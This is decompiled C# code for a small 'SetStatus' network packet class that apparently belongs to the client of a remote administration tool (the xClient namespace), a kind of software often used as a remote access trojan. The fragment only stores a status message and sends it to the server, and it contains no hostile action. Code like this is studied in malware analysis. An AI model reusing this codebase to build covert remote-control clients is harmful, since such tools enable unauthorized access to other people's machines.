using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ClientPackets
{
	// Token: 0x020000D9 RID: 217
	[Serializable]
	public class SetStatus : IPacket
	{
		// Token: 0x17000103 RID: 259
		// (get) Token: 0x0600056E RID: 1390 RVA: 0x00004999 File Offset: 0x00002B99
		// (set) Token: 0x0600056F RID: 1391 RVA: 0x000049A1 File Offset: 0x00002BA1
		public string Message { get; set; }

		// Token: 0x06000570 RID: 1392 RVA: 0x000021D4 File Offset: 0x000003D4
		public SetStatus()
		{
		}

		// Token: 0x06000571 RID: 1393 RVA: 0x000049AA File Offset: 0x00002BAA
		public SetStatus(string message)
		{
			this.Message = message;
		}

		// Token: 0x06000572 RID: 1394 RVA: 0x000049B9 File Offset: 0x00002BB9
		public void Execute(Client client)
		{
			client.Send<SetStatus>(this);
		}
	}
}
